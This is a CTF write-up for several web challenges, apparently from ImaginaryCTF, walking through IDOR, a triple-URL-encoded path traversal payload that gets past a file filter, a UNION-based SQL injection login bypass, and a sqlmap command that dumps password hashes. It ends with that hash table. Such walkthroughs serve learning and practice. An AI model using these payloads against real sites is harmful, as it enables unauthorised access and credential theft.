<h2>WEB</h2>
<h3>inspection</h3>

Just inspected the challange description and saw class named `m4rkdown_parser_fail_1a211b44`.

So the Flag is, `ictf{m4rkdown_parser_fail_1a211b44}`.

<h3>Idotriot(web)</h3>

After unzipping given source code, saw there is a code to read `/flag.txt`.
We can read it directlythe flag on http://idoriot.chal.imaginaryctf.org/flag.txt

Flag is, `ictf{1ns3cure_direct_object_reference_from_hidden_post_param_i_guess}`.
<h3>Idotriot Revenge</h3>
Similar challenge. 
Got source code of the site in zip file. 
After unzipping the file, checked source code. 
There is two condition in the code to print the flag. 
First condition is to add user_id param in url with id number of admin. 
So I assumed user id of the admin is 0 (first number in database series). 
Second condition is to preg match the username with admin. 
Used, admin1337 as username to register to bypass this and opened http://idoriot-revenge.chal.imaginaryctf.org/index.php?user_id=0.

Flag is, `ictf{this_ch4lleng3_creator_1s_really_an_idoriot}`.
<h3>Roks</h3>

Got source code of the site in zip file. 
After unzipping the file, checked source code. 
After reviewing code got an File Reader endpoint on main page `/file.php?file=IMAGE`.
File input is decoding the url encode and then check if input contains `/` and `.`. 
Checked docker file to know the location of flag and got flag.png on the web directory.
So, url encoded the payload three times to bypass Local File Inclusion (LFI) and worked.
Here is the payload,
`http://roks.chal.imaginaryctf.org/file.php?file=%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%36%25%33%36%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%37%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%30%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%37`

Flag is, `ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}`.

<h3>Perfect Picture</h3>

Got source code of the site in zip file. 
After unzipping the file, checked source code. 
After reading code we understood that, we have to upload an image with certain condition. 
So, coded an python script to generate a image with matching condition to print the flag and uploaded the flag.
Then got the flag.

Flag is, `ictf{7ruly_th3_n3x7_p1c4ss0_753433}`. 

<h3>Blank</h3>

Used SQLi injeciton to login and printed the flag.
Used username as `admin` and password as `" UNION SELECT 1337, "admin", "cat" --`.
Opened http://blank.chal.imaginaryctf.org/flag to get the flag.

Flag is, `ictf{sqli_too_powerful_9b36140a}`. 

<h3>Login</h3>

Saved login request after capturing it with burp suite. 
Then used sqlmap on it with sqlmap command `sqlmap -r login.req --batch -T users -C pwhash --dump`. 
Got two user password,
```sql
+--------------------------------------------------------------+----------+
| pwhash                                                       | username |
+--------------------------------------------------------------+----------+
| $2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S. | guest    |
| $2y$10$Is00vB1hRNHYBl9BzJwDouQFCU85YyRjJ81q0CX1a3sYtvsZvJudC | admin    |
+--------------------------------------------------------------+----------+
```

